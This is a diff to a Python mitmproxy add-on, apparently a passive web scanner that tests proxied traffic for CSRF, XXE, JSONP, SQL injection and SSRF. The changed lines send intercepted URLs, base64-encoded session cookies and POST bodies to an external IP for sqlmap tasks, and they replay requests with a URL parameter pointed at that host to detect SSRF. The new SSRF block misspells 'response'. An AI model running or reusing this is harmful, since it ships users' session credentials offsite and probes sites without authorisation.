@@ -4,6 +4,7 @@ import re
 from libmproxy.flow import FlowWriter
 from libmproxy.script import concurrent
 import requests,json
+import base64
 #from libmproxy.protocol.http import decoded
 DEBUG="DEBUG2"
 CSRF_FOUND_URLS=[]
@@ -14,7 +15,7 @@ JSONP_FOUND_URLS=["http://api.share.baidu.com/getnum"]
 SQLI_FOUND_URLS=[]
 SQLI_POST_HAVE_CHECKED_URLS=[]
 SQLI_GET_HAVE_CHECKED_URLS=[]
-SSRF_SITE="113.251.171.47"
+SSRF_SITE="203.195.211.242"
 ######options check which######
 ENABLE_CSRF=1
 ENABLE_XXE=1
@@ -138,17 +139,6 @@ def request(context, flow):
 			if file_include(values):
 				output(FILE_INCLUDE_FOUND_URLS,request,"File include",context)
 		r=url_include_site(values)
-		if r:
-			#SSRF
-			if ENABLE_SSRF:
-				#not will be xxx.com/a.gif?wap=xxx.com
-				#not check POST
-				if p(["url","domain","share","wap","link","src","source","target","3g","display","u"],str(request.get_query().keys())) and php_file_include(request.get_path_components()):
-					f=context.duplicate_flow(flow)
-					f.request.url=f.request.url.replace(r,SSRF_SITE)+"&xsxsxrxf=1"
-					d_print(f.request.url,2)
-					context.replay_request(f)
-					output(SSRF_FOUND_URLS,request,"SSRF",context)
 	        if request.method=="POST":
 			#if ENABLE_SSRF:
 			#	print dir(request)
@@ -172,8 +162,9 @@ def request(context, flow):
 					cookie=request.headers['cookie'][0]
 				if len(request.headers['referer'])>0:
 					referer=request.headers['referer'][0]
-				args = {'args': [request.url,cookie,referer,"mitm-test-for-get"]}
-				resp = requests.post("http://localhost:5555/api/task/async-apply/tasks.sqlmap_dispath", data=json.dumps(args))
+				args = {'args': [request.url,base64.encodestring(cookie),referer,"mitm-test-for-get"]}
+				#resp = requests.post("http://localhost:5555/api/task/async-apply/tasks.sqlmap_dispath", data=json.dumps(args))
+				resp = requests.post("http://203.195.211.242:9000/api/task/async-apply/tasks.sqlmap_dispath", data=json.dumps(args))
 				#resp = tasks.sqlmap_dispath.delay(request.url,cookie,referer,"mitm-test-for-get")
 				#print "push ",resp
 			if request.method=="POST" and chongfu(request,SQLI_POST_HAVE_CHECKED_URLS):
@@ -188,8 +179,9 @@ def request(context, flow):
 				if len(request.headers['referer'])>0:
 					referer=request.headers['referer'][0]
 				data=request.content
-				args = {'args': [request.url,cookie,referer,data]}
-				resp = requests.post("http://localhost:5555/api/task/async-apply/tasks.sqlmap_dispath", data=json.dumps(args))
+				args = {'args': [request.url,base64.encodestring(cookie),referer,base64.encodestring(data)]}
+				#resp = requests.post("http://localhost:5555/api/task/async-apply/tasks.sqlmap_dispath", data=json.dumps(args))
+				resp = requests.post("http://203.195.211.242:9000/api/task/async-apply/tasks.sqlmap_dispath", data=json.dumps(args))
 				#resp = tasks.sqlmap_dispath.delay(request.url,cookie,referer,data)
 				print "push ",resp
 			
@@ -207,7 +199,7 @@ def response(context,flow):
 			d_print("CSRF Response content Debug:")
 			d_print(response.content)
 			#CSRF response keywords.
-			if p(["success","fail","data","msg","成功","失败","返回"],response.content):
+			if p_re(["success","fail","data","msg","成[ \t\n\x0B\f\r]{0,}功","失[ \t\n\x0B\f\r]{0,}败","返[ \t\n\x0B\f\r]{0,}回"],response.content):
 				if len(request.headers['user-agent'])>0 and p(["mozilla","firefox","ie"],request.headers['user-agent'][0]):
 					CSRF_check(request,context)
 		if ENABLE_XXE:
@@ -222,4 +214,24 @@ def response(context,flow):
 		if ENABLE_JSONP:
 			if p(["callback","json"],request.url):
 					output(JSONP_FOUND_URLS,request,"JSONP",context)
+		values=get_values(request.get_query().items())
+		r=url_include_site(values)
+		#已经保证这个链接是有参数的
+		if r:
+			#SSRF
+			if ENABLE_SSRF:
+				#not will be xxx.com/a.gif?wap=xxx.com
+				#检查POST请求的内容
+				#外网IP日志确认SSRF
+				#如果机器限制IP，根据参数关键字和页面关键字。参数关键字是url,domain这些，页面关键字是"扫描"，"检测"这些
+				if p(["url","domain","share","wap","link","src","source","target","3g","display","u"],str(request.get_query().keys())) and php_file_include(request.get_path_components()):
+					f=context.duplicate_flow(flow)
+					f.request.url=f.request.url.replace(r,SSRF_SITE)+"&xsxsxrxf=1"
+					d_print(f.request.url,2)
+					context.replay_request(f)
+					#页面关键字有待补充，正则估计会非常慢
+					if p_re(["检[ \t\n\x0B\f\r]{0,}查","检[ \t\n\x0B\f\r]{0,}测","扫[ \t\n\x0B\f\r]{0,}描","搜[ \t\n\x0B\f\r]{0,}索"],reponse.content):
+						output(SSRF_FOUND_URLS,request,"SSRF",context)
+						
+
 
